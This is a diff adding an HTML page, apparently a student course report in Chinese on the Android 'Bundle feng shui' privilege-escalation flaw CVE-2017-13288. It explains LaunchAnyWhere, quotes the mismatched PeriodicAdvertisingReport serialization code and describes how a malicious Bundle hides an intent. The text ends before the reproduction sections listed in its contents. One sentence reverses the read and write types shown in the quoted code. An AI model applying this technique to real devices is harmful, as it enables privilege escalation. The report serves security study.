@@ -1,0 +1,608 @@
+<!DOCTYPE html>
+<html class="no-js" lang="zh">
+<head>
+<meta charset="utf-8"/>
+<meta content="width=device-width,initial-scale=1" name="viewport"/>
+<meta content="好鸭笔记本（x" name="description"/>
+<meta content="Gooduck Z" name="author"/>
+<link href="../../cs50ai/1/" rel="prev"/>
+<link href="../../notes/" rel="next"/>
+<link href="../../assets/images/favicon.png" rel="icon"/>
+<meta content="mkdocs-1.4.2, mkdocs-material-9.0.14" name="generator"/>
+<title>网络空间安全导论报告 - Gooduck 的笔记本</title>
+<link href="../../assets/stylesheets/main.113286f1.min.css" rel="stylesheet"/>
+<link href="../../assets/stylesheets/palette.a0c5b2b5.min.css" rel="stylesheet"/>
+<link crossorigin="" href="https://fonts.gstatic.com" rel="preconnect"/>
+<link href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&amp;display=fallback" rel="stylesheet"/>
+<style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
+<link href="../../css/heti.css" rel="stylesheet"/>
+<link href="../../css/collapse.css" rel="stylesheet"/>
+<link href="../../css/extra.css" rel="stylesheet"/>
+<script>__md_scope=new URL("../..",location),__md_hash=e=>[...e].reduce((e,_)=>(e<<5)-e+_.charCodeAt(0),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+</head>
+<body data-md-color-accent="" data-md-color-primary="white" data-md-color-scheme="indigo" dir="ltr">
+<script>var palette=__md_get("__palette");if(palette&&"object"==typeof palette.color)for(var key of Object.keys(palette.color))document.body.setAttribute("data-md-color-"+key,palette.color[key])</script>
+<input autocomplete="off" class="md-toggle" data-md-toggle="drawer" id="__drawer" type="checkbox"/>
+<input autocomplete="off" class="md-toggle" data-md-toggle="search" id="__search" type="checkbox"/>
+<label class="md-overlay" for="__drawer"></label>
+<div data-md-component="skip">
+<a class="md-skip" href="#bundle">
+          跳转至
+        </a>
+</div>
+<div data-md-component="announce">
+</div>
+<header class="md-header" data-md-component="header">
+<nav aria-label="页眉" class="md-header__inner md-grid">
+<a aria-label="Gooduck 的笔记本" class="md-header__button md-logo" data-md-component="logo" href="../.." title="Gooduck 的笔记本">
+<svg viewbox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54Z"></path></svg>
+</a>
+<label class="md-header__button md-icon" for="__drawer">
+<svg viewbox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M3 6h18v2H3V6m0 5h18v2H3v-2m0 5h18v2H3v-2Z"></path></svg>
+</label>
+<div class="md-header__title" data-md-component="header-title">
+<div class="md-header__ellipsis">
+<div class="md-header__topic">
+<span class="md-ellipsis">
+            Gooduck 的笔记本
+          </span>
+</div>
+<div class="md-header__topic" data-md-component="header-topic">
+<span class="md-ellipsis">
+            
+              网络空间安全导论报告
+            
+          </span>
+</div>
+</div>
+</div>
+<form class="md-header__option" data-md-component="palette">
+<input aria-label="Switch to dark mode" class="md-option" data-md-color-accent="" data-md-color-media="(prefers-color-scheme: light)" data-md-color-primary="white" data-md-color-scheme="indigo" id="__palette_1" name="__palette" type="radio"/>
+<label class="md-header__button md-icon" for="__palette_2" hidden="" title="Switch to dark mode">
+<svg viewbox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M12 7a5 5 0 0 1 5 5 5 5 0 0 1-5 5 5 5 0 0 1-5-5 5 5 0 0 1 5-5m0 2a3 3 0 0 0-3 3 3 3 0 0 0 3 3 3 3 0 0 0 3-3 3 3 0 0 0-3-3m0-7 2.39 3.42C13.65 5.15 12.84 5 12 5c-.84 0-1.65.15-2.39.42L12 2M3.34 7l4.16-.35A7.2 7.2 0 0 0 5.94 8.5c-.44.74-.69 1.5-.83 2.29L3.34 7m.02 10 1.76-3.77a7.131 7.131 0 0 0 2.38 4.14L3.36 17M20.65 7l-1.77 3.79a7.023 7.023 0 0 0-2.38-4.15l4.15.36m-.01 10-4.14.36c.59-.51 1.12-1.14 1.54-1.86.42-.73.69-1.5.83-2.29L20.64 17M12 22l-2.41-3.44c.74.27 1.55.44 2.41.44.82 0 1.63-.17 2.37-.44L12 22Z"></path></svg>
+</label>
+<input aria-label="Switch to light mode" class="md-option" data-md-color-accent="" data-md-color-media="(prefers-color-scheme: dark)" data-md-color-primary="" data-md-color-scheme="slate" id="__palette_2" name="__palette" type="radio"/>
+<label class="md-header__button md-icon" for="__palette_1" hidden="" title="Switch to light mode">
+<svg viewbox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="m17.75 4.09-2.53 1.94.91 3.06-2.63-1.81-2.63 1.81.91-3.06-2.53-1.94L12.44 4l1.06-3 1.06 3 3.19.09m3.5 6.91-1.64 1.25.59 1.98-1.7-1.17-1.7 1.17.59-1.98L15.75 11l2.06-.05L18.5 9l.69 1.95 2.06.05m-2.28 4.95c.83-.08 1.72 1.1 1.19 1.85-.32.45-.66.87-1.08 1.27C15.17 23 8.84 23 4.94 19.07c-3.91-3.9-3.91-10.24 0-14.14.4-.4.82-.76 1.27-1.08.75-.53 1.93.36 1.85 1.19-.27 2.86.69 5.83 2.89 8.02a9.96 9.96 0 0 0 8.02 2.89m-1.64 2.02a12.08 12.08 0 0 1-7.8-3.47c-2.17-2.19-3.33-5-3.49-7.82-2.81 3.14-2.7 7.96.31 10.98 3.02 3.01 7.84 3.12 10.98.31Z"></path></svg>
+</label>
+</form>
+<label class="md-header__button md-icon" for="__search">
+<svg viewbox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5Z"></path></svg>
+</label>
+<div class="md-search" data-md-component="search" role="dialog">
+<label class="md-search__overlay" for="__search"></label>
+<div class="md-search__inner" role="search">
+<form class="md-search__form" name="search">
+<input aria-label="搜索" autocapitalize="off" autocomplete="off" autocorrect="off" class="md-search__input" data-md-component="search-query" name="query" placeholder="搜索" required="" spellcheck="false" type="text"/>
+<label class="md-search__icon md-icon" for="__search">
+<svg viewbox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5Z"></path></svg>
+<svg viewbox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12Z"></path></svg>
+</label>
+<nav aria-label="查找" class="md-search__options">
+<button aria-label="清空当前内容" class="md-search__icon md-icon" tabindex="-1" title="清空当前内容" type="reset">
+<svg viewbox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12 19 6.41Z"></path></svg>
+</button>
+</nav>
+</form>
+<div class="md-search__output">
+<div class="md-search__scrollwrap" data-md-scrollfix="">
+<div class="md-search-result" data-md-component="search-result">
+<div class="md-search-result__meta">
+            正在初始化搜索引擎
+          </div>
+<ol class="md-search-result__list" role="presentation"></ol>
+</div>
+</div>
+</div>
+</div>
+</div>
+<div class="md-header__source">
+<a class="md-source" data-md-component="source" href="https://github.com/GooduckZ/note/" title="前往仓库">
+<div class="md-source__icon md-icon">
+<svg viewbox="0 0 448 512" xmlns="http://www.w3.org/2000/svg"><!--! Font Awesome Free 6.3.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2023 Fonticons, Inc.--><path d="M439.55 236.05 244 40.45a28.87 28.87 0 0 0-40.81 0l-40.66 40.63 51.52 51.52c27.06-9.14 52.68 16.77 43.39 43.68l49.66 49.66c34.23-11.8 61.18 31 35.47 56.69-26.49 26.49-70.21-2.87-56-37.34L240.22 199v121.85c25.3 12.54 22.26 41.85 9.08 55a34.34 34.34 0 0 1-48.55 0c-17.57-17.6-11.07-46.91 11.25-56v-123c-20.8-8.51-24.6-30.74-18.64-45L142.57 101 8.45 235.14a28.86 28.86 0 0 0 0 40.81l195.61 195.6a28.86 28.86 0 0 0 40.8 0l194.69-194.69a28.86 28.86 0 0 0 0-40.81z"></path></svg>
+</div>
+<div class="md-source__repository">
+    GooduckZ/note
+  </div>
+</a>
+</div>
+</nav>
+</header>
+<div class="md-container" data-md-component="container">
+<main class="md-main" data-md-component="main">
+<div class="md-main__inner md-grid">
+<div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation">
+<div class="md-sidebar__scrollwrap">
+<div class="md-sidebar__inner">
+<nav aria-label="导航栏" class="md-nav md-nav--primary" data-md-level="0">
+<label class="md-nav__title" for="__drawer">
+<a aria-label="Gooduck 的笔记本" class="md-nav__button md-logo" data-md-component="logo" href="../.." title="Gooduck 的笔记本">
+<svg viewbox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54Z"></path></svg>
+</a>
+    Gooduck 的笔记本
+  </label>
+<div class="md-nav__source">
+<a class="md-source" data-md-component="source" href="https://github.com/GooduckZ/note/" title="前往仓库">
+<div class="md-source__icon md-icon">
+<svg viewbox="0 0 448 512" xmlns="http://www.w3.org/2000/svg"><!--! Font Awesome Free 6.3.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2023 Fonticons, Inc.--><path d="M439.55 236.05 244 40.45a28.87 28.87 0 0 0-40.81 0l-40.66 40.63 51.52 51.52c27.06-9.14 52.68 16.77 43.39 43.68l49.66 49.66c34.23-11.8 61.18 31 35.47 56.69-26.49 26.49-70.21-2.87-56-37.34L240.22 199v121.85c25.3 12.54 22.26 41.85 9.08 55a34.34 34.34 0 0 1-48.55 0c-17.57-17.6-11.07-46.91 11.25-56v-123c-20.8-8.51-24.6-30.74-18.64-45L142.57 101 8.45 235.14a28.86 28.86 0 0 0 0 40.81l195.61 195.6a28.86 28.86 0 0 0 40.8 0l194.69-194.69a28.86 28.86 0 0 0 0-40.81z"></path></svg>
+</div>
+<div class="md-source__repository">
+    GooduckZ/note
+  </div>
+</a>
+</div>
+<ul class="md-nav__list" data-md-scrollfix="">
+<li class="md-nav__item">
+<a class="md-nav__link" href="../..">
+        主页
+      </a>
+</li>
+<li class="md-nav__item md-nav__item--nested">
+<input class="md-nav__toggle md-toggle" id="__nav_2" type="checkbox"/>
+<label class="md-nav__link" for="__nav_2" id="__nav_2_label" tabindex="0">
+          Python 相关
+          <span class="md-nav__icon md-icon"></span>
+</label>
+<nav aria-expanded="false" aria-labelledby="__nav_2_label" class="md-nav" data-md-level="1">
+<label class="md-nav__title" for="__nav_2">
+<span class="md-nav__icon md-icon"></span>
+          Python 相关
+        </label>
+<ul class="md-nav__list" data-md-scrollfix="">
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../python/matplotlib/">
+        matplotlib 笔记
+      </a>
+</li>
+</ul>
+</nav>
+</li>
+<li class="md-nav__item md-nav__item--nested">
+<input class="md-nav__toggle md-toggle" id="__nav_3" type="checkbox"/>
+<label class="md-nav__link" for="__nav_3" id="__nav_3_label" tabindex="0">
+          CS50AI 学习笔记
+          <span class="md-nav__icon md-icon"></span>
+</label>
+<nav aria-expanded="false" aria-labelledby="__nav_3_label" class="md-nav" data-md-level="1">
+<label class="md-nav__title" for="__nav_3">
+<span class="md-nav__icon md-icon"></span>
+          CS50AI 学习笔记
+        </label>
+<ul class="md-nav__list" data-md-scrollfix="">
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../cs50ai/0/">
+        0.Search
+      </a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../cs50ai/1/">
+        1.Knowledge
+      </a>
+</li>
+</ul>
+</nav>
+</li>
+<li class="md-nav__item md-nav__item--active md-nav__item--nested">
+<input checked="" class="md-nav__toggle md-toggle" id="__nav_4" type="checkbox"/>
+<label class="md-nav__link" for="__nav_4" id="__nav_4_label" tabindex="0">
+          课程报告
+          <span class="md-nav__icon md-icon"></span>
+</label>
+<nav aria-expanded="true" aria-labelledby="__nav_4_label" class="md-nav" data-md-level="1">
+<label class="md-nav__title" for="__nav_4">
+<span class="md-nav__icon md-icon"></span>
+          课程报告
+        </label>
+<ul class="md-nav__list" data-md-scrollfix="">
+<li class="md-nav__item md-nav__item--active">
+<input class="md-nav__toggle md-toggle" id="__toc" type="checkbox"/>
+<label class="md-nav__link md-nav__link--active" for="__toc">
+          网络空间安全导论报告
+          <span class="md-nav__icon md-icon"></span>
+</label>
+<a class="md-nav__link md-nav__link--active" href="./">
+        网络空间安全导论报告
+      </a>
+<nav aria-label="目录" class="md-nav md-nav--secondary">
+<label class="md-nav__title" for="__toc">
+<span class="md-nav__icon md-icon"></span>
+      目录
+    </label>
+<ul class="md-nav__list" data-md-component="toc" data-md-scrollfix="">
+<li class="md-nav__item">
+<a class="md-nav__link" href="#_1">
+    漏洞综述
+  </a>
+<nav aria-label="漏洞综述" class="md-nav">
+<ul class="md-nav__list">
+<li class="md-nav__item">
+<a class="md-nav__link" href="#_2">
+    相关简介
+  </a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="#cve-2017-13288">
+    CVE-2017-13288
+  </a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="#cve-2023-20963">
+    CVE-2023-20963
+  </a>
+</li>
+</ul>
+</nav>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="#_3">
+    漏洞原理
+  </a>
+<nav aria-label="漏洞原理" class="md-nav">
+<ul class="md-nav__list">
+<li class="md-nav__item">
+<a class="md-nav__link" href="#launchanywhere">
+    LaunchAnyWhere 简介
+  </a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="#periodicadvertisingreport">
+    PeriodicAdvertisingReport 简介
+  </a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="#cve-2017-13288_1">
+    CVE-2017-13288 漏洞原理
+  </a>
+</li>
+</ul>
+</nav>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="#_4">
+    漏洞复现
+  </a>
+<nav aria-label="漏洞复现" class="md-nav">
+<ul class="md-nav__list">
+<li class="md-nav__item">
+<a class="md-nav__link" href="#authenticatorservice">
+    提供 AuthenticatorService 服务
+  </a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="#myauthenticator">
+    实现 MyAuthenticator
+  </a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="#mainactivity">
+    在 MainActivity 中请求添加账户
+  </a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="#bundle_1">
+    输出恶意 Bundle 的内容
+  </a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="#_5">
+    复现攻击
+  </a>
+</li>
+</ul>
+</nav>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="#_6">
+    漏洞修复
+  </a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="#reference">
+    Reference
+  </a>
+</li>
+</ul>
+</nav>
+</li>
+</ul>
+</nav>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../notes/">
+        课程笔记
+      </a>
+</li>
+</ul>
+</nav>
+</div>
+</div>
+</div>
+<div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc">
+<div class="md-sidebar__scrollwrap">
+<div class="md-sidebar__inner">
+<nav aria-label="目录" class="md-nav md-nav--secondary">
+<label class="md-nav__title" for="__toc">
+<span class="md-nav__icon md-icon"></span>
+      目录
+    </label>
+<ul class="md-nav__list" data-md-component="toc" data-md-scrollfix="">
+<li class="md-nav__item">
+<a class="md-nav__link" href="#_1">
+    漏洞综述
+  </a>
+<nav aria-label="漏洞综述" class="md-nav">
+<ul class="md-nav__list">
+<li class="md-nav__item">
+<a class="md-nav__link" href="#_2">
+    相关简介
+  </a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="#cve-2017-13288">
+    CVE-2017-13288
+  </a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="#cve-2023-20963">
+    CVE-2023-20963
+  </a>
+</li>
+</ul>
+</nav>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="#_3">
+    漏洞原理
+  </a>
+<nav aria-label="漏洞原理" class="md-nav">
+<ul class="md-nav__list">
+<li class="md-nav__item">
+<a class="md-nav__link" href="#launchanywhere">
+    LaunchAnyWhere 简介
+  </a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="#periodicadvertisingreport">
+    PeriodicAdvertisingReport 简介
+  </a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="#cve-2017-13288_1">
+    CVE-2017-13288 漏洞原理
+  </a>
+</li>
+</ul>
+</nav>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="#_4">
+    漏洞复现
+  </a>
+<nav aria-label="漏洞复现" class="md-nav">
+<ul class="md-nav__list">
+<li class="md-nav__item">
+<a class="md-nav__link" href="#authenticatorservice">
+    提供 AuthenticatorService 服务
+  </a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="#myauthenticator">
+    实现 MyAuthenticator
+  </a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="#mainactivity">
+    在 MainActivity 中请求添加账户
+  </a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="#bundle_1">
+    输出恶意 Bundle 的内容
+  </a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="#_5">
+    复现攻击
+  </a>
+</li>
+</ul>
+</nav>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="#_6">
+    漏洞修复
+  </a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="#reference">
+    Reference
+  </a>
+</li>
+</ul>
+</nav>
+</div>
+</div>
+</div>
+<div class="md-content" data-md-component="content">
+<article class="md-content__inner md-typeset">
+<h1 id="bundle">“<span>Bundle<span class="heti-spacing"> </span></span>风水”漏洞复现与恶意代码分析<a class="headerlink" href="#bundle" title="Permanent link"><span><span class="heti-spacing"> </span>¶</span></a></h1>
+<h2 id="_1">漏洞综述<a class="headerlink" href="#_1" title="Permanent link"><span><span class="heti-spacing"> </span>¶</span></a></h2>
+<h3 id="_2">相关简介<a class="headerlink" href="#_2" title="Permanent link"><span><span class="heti-spacing"> </span>¶</span></a></h3>
+<p><span>Bundle<span class="heti-spacing"> </span></span>是一种在<span class="heti-skip"><span class="heti-spacing"> </span>Android<span class="heti-spacing"> </span></span>系统中被用来在各个应用间传输数据的结构。<span>Bundle<span class="heti-spacing"> </span></span>的内部实现是哈希表，以键值对的形式存储数据，并通过序列化（将类转换成字节串）与反序列化（将字节串转换成原类型）的方式实现不同应用间传输数据。</p>
+<h3 id="cve-2017-13288">CVE-2017-13288<a class="headerlink" href="#cve-2017-13288" title="Permanent link">¶</a></h3>
+<p><span>CVE-2017-13288<span class="heti-spacing"> </span></span>是一个<span><span class="heti-spacing"> </span>CVSS3.0</span>（通用漏洞评分系统）评分<span class="heti-skip"><span class="heti-spacing"> </span>7.8<span class="heti-spacing"> </span></span>分、评级<span class="heti-skip"><span class="heti-spacing"> </span>high<span class="heti-spacing"> </span></span>的高危漏洞。它通过<span class="heti-skip"><span class="heti-spacing"> </span>Bundle<span class="heti-spacing"> </span></span>的序列化与反序列化不匹配，绕过<span class="heti-skip"><span class="heti-spacing"> </span>intent<span class="heti-spacing"> </span></span>的检测机制，从而获得<span class="heti-skip"><span class="heti-spacing"> </span>LaunchAnyWhere<span class="heti-spacing"> </span></span>权限。</p>
+<p>该漏洞由于<code>android.bluetooth.le.PeriodicAdvertisingReport</code>这个类型存在<span class="heti-skip"><span class="heti-spacing"> </span>Parcelable<span class="heti-spacing"> </span></span>序列化与反序列化不匹配漏洞，进而导致在类型读与写入过程中发生变化，结果导致恶意<span class="heti-skip"><span class="heti-spacing"> </span>intent<span class="heti-spacing"> </span></span>绕过了检测。</p>
+<h3 id="cve-2023-20963">CVE-2023-20963<a class="headerlink" href="#cve-2023-20963" title="Permanent link">¶</a></h3>
+<p><span>CVE-2023-20963<span class="heti-spacing"> </span></span>是一个于<span class="heti-skip"><span class="heti-spacing"> </span>2023<span class="heti-spacing"> </span></span>年<span class="heti-skip"><span class="heti-spacing"> </span>3<span class="heti-spacing"> </span></span>月披露的危险漏洞，基本原理与前者相同。该漏洞此前在某知名电商应用中被发现使用，随后<span class="heti-skip"><span class="heti-spacing"> </span>Google Play<span class="heti-spacing"> </span></span>立即下架了该应用。由于该应用的广泛使用，全球受影响的设备数可谓史无前例。</p>
+<h2 id="_3">漏洞原理<a class="headerlink" href="#_3" title="Permanent link"><span><span class="heti-spacing"> </span>¶</span></a></h2>
+<h3 id="launchanywhere"><span>LaunchAnyWhere<span class="heti-spacing"> </span></span>简介<a class="headerlink" href="#launchanywhere" title="Permanent link"><span><span class="heti-spacing"> </span>¶</span></a></h3>
+<p><span>LaunchAnyWhere<span class="heti-spacing"> </span></span>是一个早期存在于<span class="heti-skip"><span class="heti-spacing"> </span>Android<span class="heti-spacing"> </span></span>系统之中的危险漏洞。该漏洞利用了<span class="heti-skip"><span class="heti-spacing"> </span>AccountManagerService<span class="heti-spacing"> </span></span>接口，通过提供“添加账号”的服务，借助<span class="heti-skip"><span class="heti-spacing"> </span>Settings<span class="heti-spacing"> </span></span>的高权限完成越权。下图展示了完成<code>addAccount</code>的全过程：</p>
+<p><img alt="img" src="https://1ce0ear.github.io/images/Bundle/8.jpg"/></p>
+<p>该漏洞在<span class="heti-skip"><span class="heti-spacing"> </span>Android 4.4<span class="heti-spacing"> </span></span>中被修复，修复方法是，在<span class="heti-skip"><span class="heti-spacing"> </span>AccountManagerService<span class="heti-spacing"> </span></span>中对应用指定的<span class="heti-skip"><span class="heti-spacing"> </span>intent<span class="heti-spacing"> </span></span>进行检查，确保<span class="heti-skip"><span class="heti-spacing"> </span>intent<span class="heti-spacing"> </span></span>中目标<span class="heti-skip"><span class="heti-spacing"> </span>Activity<span class="heti-spacing"> </span></span>所属包的签名与调用应用一致。</p>
+<h3 id="periodicadvertisingreport"><span>PeriodicAdvertisingReport<span class="heti-spacing"> </span></span>简介<a class="headerlink" href="#periodicadvertisingreport" title="Permanent link"><span><span class="heti-spacing"> </span>¶</span></a></h3>
+<p><span>PeriodicAdvertisingReport<span class="heti-spacing"> </span></span>是在<span class="heti-skip"><span class="heti-spacing"> </span>Android<span class="heti-spacing"> </span></span>系统中存在的一个类，是<span class="heti-skip"><span class="heti-spacing"> </span>Parcelabel<span class="heti-spacing"> </span></span>的子类，官方的代码中给出了<span class="heti-skip"><span class="heti-spacing"> </span>PeriodicAdvertisingReport<span class="heti-spacing"> </span></span>的序列化以及反序列化的实现：</p>
+<div class="highlight"><pre><span></span><code><span class="nd">@Override</span>
+<span class="kd">public</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">writeToParcel</span><span class="p">(</span><span class="n">Parcel</span><span class="w"> </span><span class="n">dest</span><span class="p">,</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">flags</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="n">dest</span><span class="p">.</span><span class="na">writeInt</span><span class="p">(</span><span class="n">syncHandle</span><span class="p">);</span>
+<span class="w">    </span><span class="n">dest</span><span class="p">.</span><span class="na">writeLong</span><span class="p">(</span><span class="n">txPower</span><span class="p">);</span>
+<span class="w">    </span><span class="n">dest</span><span class="p">.</span><span class="na">writeInt</span><span class="p">(</span><span class="n">rssi</span><span class="p">);</span>
+<span class="w">    </span><span class="n">dest</span><span class="p">.</span><span class="na">writeInt</span><span class="p">(</span><span class="n">dataStatus</span><span class="p">);</span>
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">data</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="kc">null</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="n">dest</span><span class="p">.</span><span class="na">writeInt</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span><span class="c1">//flag == 1</span>
+<span class="w">        </span><span class="n">dest</span><span class="p">.</span><span class="na">writeByteArray</span><span class="p">(</span><span class="n">data</span><span class="p">.</span><span class="na">getBytes</span><span class="p">());</span>
+<span class="w">    </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="n">dest</span><span class="p">.</span><span class="na">writeInt</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span><span class="c1">//flag == 0</span>
+<span class="w">    </span><span class="p">}</span>
+<span class="p">}</span>
+
+<span class="kd">private</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">readFromParcel</span><span class="p">(</span><span class="n">Parcel</span><span class="w"> </span><span class="n">in</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="n">syncHandle</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">in</span><span class="p">.</span><span class="na">readInt</span><span class="p">();</span>
+<span class="w">    </span><span class="n">txPower</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">in</span><span class="p">.</span><span class="na">readInt</span><span class="p">();</span>
+<span class="w">    </span><span class="n">rssi</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">in</span><span class="p">.</span><span class="na">readInt</span><span class="p">();</span>
+<span class="w">    </span><span class="n">dataStatus</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">in</span><span class="p">.</span><span class="na">readInt</span><span class="p">();</span>
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">in</span><span class="p">.</span><span class="na">readInt</span><span class="p">()</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mi">1</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="c1">//flag == 1</span>
+<span class="w">        </span><span class="n">data</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">ScanRecord</span><span class="p">.</span><span class="na">parseFromBytes</span><span class="p">(</span><span class="n">in</span><span class="p">.</span><span class="na">createByteArray</span><span class="p">());</span>
+<span class="w">    </span><span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div>
+<p>其中，<code>txPower</code>在读入时为<span class="heti-skip"><span class="heti-spacing"> </span>long<span class="heti-spacing"> </span></span>而在输出时为<span><span class="heti-spacing"> </span>int</span>，在此处造成了不匹配并导致错位，引发漏洞的产生。</p>
+<h3 id="cve-2017-13288_1"><span>CVE-2017-13288<span class="heti-spacing"> </span></span>漏洞原理<a class="headerlink" href="#cve-2017-13288_1" title="Permanent link"><span><span class="heti-spacing"> </span>¶</span></a></h3>
+<p>攻击者通过构造特殊的恶意<span><span class="heti-spacing"> </span>Parcel</span>，使得该<span class="heti-skip"><span class="heti-spacing"> </span>Parcel<span class="heti-spacing"> </span></span>在被读取后其中的恶意<span class="heti-skip"><span class="heti-spacing"> </span>intent<span class="heti-spacing"> </span></span>被隐藏，而重新写入之后恶意<span class="heti-skip"><span class="heti-spacing"> </span>intent<span class="heti-spacing"> </span></span>被读入，并最终实现权限提升。</p>
+<p>攻击者在提供<span class="heti-skip"><span class="heti-spacing"> </span>AccountAuthenticator<span class="heti-spacing"> </span></span>的应用中构造一个恶意<span><span class="heti-spacing"> </span>Bundle</span>，其中带有两个键值对。其一为<span class="heti-skip"><span class="heti-spacing"> </span>PeriodicAdvertisingReport<span class="heti-spacing"> </span></span>对象，将 <code>syncHandle</code>、<code>txPower</code>、<code>rssi</code>、<code>dataStatus</code>以及判断是否读取 <code>data</code> 的<code>flag</code>设为<span><span class="heti-spacing"> </span>1</span>，将恶意<span class="heti-skip"><span class="heti-spacing"> </span>intent<span class="heti-spacing"> </span></span>放于<span class="heti-skip"><span class="heti-spacing"> </span>data<span class="heti-spacing"> </span></span>之中（类型是<span><span class="heti-spacing"> </span>ByteArray</span>）；第二个键值对用于占位，使发生偏移后的<span class="heti-skip"><span class="heti-spacing"> </span>intent<span class="heti-spacing"> </span></span>可以被读取。此时这个类完成第一次序列化并传递给系统。</p>
